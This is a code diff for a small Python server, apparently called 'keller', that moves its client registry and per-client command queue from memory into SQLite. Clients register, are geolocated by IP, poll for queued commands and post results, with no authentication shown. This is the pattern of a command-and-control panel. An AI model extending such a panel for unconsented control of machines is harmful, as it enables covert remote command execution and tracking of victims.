@@ -4,9 +4,11 @@ from urllib.parse import urlparse, parse_qs
 from urllib.request import urlopen
 from urllib.error import URLError
 import json
-import queue
 import random
+import sqlite3
+import threading
 import time
+import os
 
 INDEX_PAGE = """
 <html>
@@ -90,13 +92,36 @@ INDEX_PAGE = """
 </html>
 """
 
-clients = set()
-client_queues = {}
-client_results = {}
-client_locations = {}
-client_ips = {}
-ip_counts = {}
-client_last_seen = {}
+DB_FILE = 'keller.db'
+# open SQLite connection shared across threads
+conn = sqlite3.connect(DB_FILE, check_same_thread=False)
+conn.row_factory = sqlite3.Row
+with conn:
+    conn.execute(
+        'CREATE TABLE IF NOT EXISTS clients('
+        'id TEXT PRIMARY KEY, ip TEXT, lat REAL, lon REAL,'
+        ' last_seen REAL, result TEXT)'
+    )
+    conn.execute(
+        'CREATE TABLE IF NOT EXISTS commands('
+        'id INTEGER PRIMARY KEY AUTOINCREMENT,'
+        ' client_id TEXT, command TEXT, ts REAL)'
+    )
+
+REMOVE_CLIENT_AFTER = int(os.environ.get('REMOVE_CLIENT_AFTER', '3600'))
+
+def cleanup_task():
+    while True:
+        cutoff = time.time() - REMOVE_CLIENT_AFTER
+        with conn:
+            conn.execute('DELETE FROM clients WHERE last_seen < ?', (cutoff,))
+            conn.execute(
+                'DELETE FROM commands WHERE client_id NOT IN '
+                '(SELECT id FROM clients)'
+            )
+        time.sleep(60)
+
+threading.Thread(target=cleanup_task, daemon=True).start()
 
 def geolocate(ip):
     """Return (lat, lon) for the given IP using ip-api.com."""
@@ -121,6 +146,7 @@ class Handler(BaseHTTPRequestHandler):
     def do_POST(self):
         length = int(self.headers.get('Content-Length', 0))
         data = self.rfile.read(length)
+        now = time.time()
         if self.path == '/register':
             client_id = None
             try:
@@ -130,18 +156,21 @@ class Handler(BaseHTTPRequestHandler):
             except Exception:
                 pass
             if client_id:
-                clients.add(client_id)
-                client_queues.setdefault(client_id, queue.Queue())
-                client_results.setdefault(client_id, '')
-                client_ips[client_id] = ip
-                ip_counts[ip] = ip_counts.get(ip, 0) + 1
-                client_last_seen[client_id] = time.time()
-                if client_id not in client_locations:
+                cur = conn.cursor()
+                if cur.execute('SELECT id FROM clients WHERE id=?', (client_id,)).fetchone():
+                    cur.execute('UPDATE clients SET ip=?, last_seen=? WHERE id=?', (ip, now, client_id))
+                else:
+                    count = cur.execute('SELECT COUNT(*) FROM clients WHERE ip=?', (ip,)).fetchone()[0]
                     lat, lon = geolocate(ip)
-                    if ip_counts[ip] > 1:
+                    if count > 0:
                         lat += random.uniform(-0.02, 0.02)
                         lon += random.uniform(-0.02, 0.02)
-                    client_locations[client_id] = (lat, lon)
+                    cur.execute(
+                        'INSERT INTO clients(id, ip, lat, lon, last_seen, result) '
+                        'VALUES (?,?,?,?,?,?)',
+                        (client_id, ip, lat, lon, now, '')
+                    )
+                conn.commit()
                 body = b'Registered'
                 self.send_response(200)
                 self.send_header('Content-Length', str(len(body)))
@@ -158,8 +187,12 @@ class Handler(BaseHTTPRequestHandler):
                 payload = json.loads(data.decode())
                 cid = payload.get('client_id')
                 cmd = payload.get('command')
-                if cid in clients and cmd:
-                    client_queues[cid].put(cmd)
+                if cid and cmd and conn.execute('SELECT 1 FROM clients WHERE id=?', (cid,)).fetchone():
+                    conn.execute(
+                        'INSERT INTO commands(client_id, command, ts) VALUES (?,?,?)',
+                        (cid, cmd, now)
+                    )
+                    conn.commit()
                     body = b'Command queued'
                     self.send_response(200)
                     self.send_header('Content-Length', str(len(body)))
@@ -178,9 +211,9 @@ class Handler(BaseHTTPRequestHandler):
                 payload = json.loads(data.decode())
                 cid = payload.get('client_id')
                 res = payload.get('result')
-                if cid in clients:
-                    client_results[cid] = res
-                    client_last_seen[cid] = time.time()
+                if cid and conn.execute('SELECT 1 FROM clients WHERE id=?', (cid,)).fetchone():
+                    conn.execute('UPDATE clients SET result=?, last_seen=? WHERE id=?', (res, now, cid))
+                    conn.commit()
                     body = b'Result stored'
                     self.send_response(200)
                     self.send_header('Content-Length', str(len(body)))
@@ -201,17 +234,10 @@ class Handler(BaseHTTPRequestHandler):
     def do_GET(self):
         parsed = urlparse(self.path)
         if parsed.path == '/clients':
-            body = json.dumps([
-                {
-                    'id': cid,
-                    'ip': client_ips.get(cid, ''),
-                    'lat': client_locations.get(cid, (0, 0))[0],
-                    'lon': client_locations.get(cid, (0, 0))[1],
-                    'result': client_results.get(cid, ''),
-                    'last_seen': client_last_seen.get(cid, 0)
-                }
-                for cid in sorted(clients)
-            ]).encode()
+            rows = conn.execute(
+                'SELECT id, ip, lat, lon, result, last_seen FROM clients'
+            ).fetchall()
+            body = json.dumps([dict(row) for row in rows]).encode()
             self.send_response(200)
             self.send_header('Content-Type', 'application/json')
             self.send_header('Content-Length', str(len(body)))
@@ -220,12 +246,18 @@ class Handler(BaseHTTPRequestHandler):
         elif parsed.path == '/poll':
             qs = parse_qs(parsed.query)
             cid = qs.get('client_id', [None])[0]
-            if cid in clients:
-                client_last_seen[cid] = time.time()
-                try:
-                    cmd = client_queues[cid].get(timeout=30)
-                except queue.Empty:
-                    cmd = None
+            row = conn.execute('SELECT id FROM clients WHERE id=?', (cid,)).fetchone()
+            if row:
+                conn.execute('UPDATE clients SET last_seen=? WHERE id=?', (time.time(), cid))
+                cmd_row = conn.execute(
+                    'SELECT id, command FROM commands WHERE client_id=? ORDER BY id LIMIT 1',
+                    (cid,)
+                ).fetchone()
+                cmd = None
+                if cmd_row:
+                    cmd = cmd_row['command']
+                    conn.execute('DELETE FROM commands WHERE id=?', (cmd_row['id'],))
+                conn.commit()
                 body = json.dumps({'command': cmd}).encode()
                 self.send_response(200)
                 self.send_header('Content-Type', 'application/json')
@@ -239,8 +271,9 @@ class Handler(BaseHTTPRequestHandler):
         elif parsed.path == '/result':
             qs = parse_qs(parsed.query)
             cid = qs.get('client_id', [None])[0]
-            if cid in clients:
-                body = json.dumps({'result': client_results.get(cid, '')}).encode()
+            row = conn.execute('SELECT result FROM clients WHERE id=?', (cid,)).fetchone()
+            if row:
+                body = json.dumps({'result': row['result']}).encode()
                 self.send_response(200)
                 self.send_header('Content-Type', 'application/json')
                 self.send_header('Content-Length', str(len(body)))
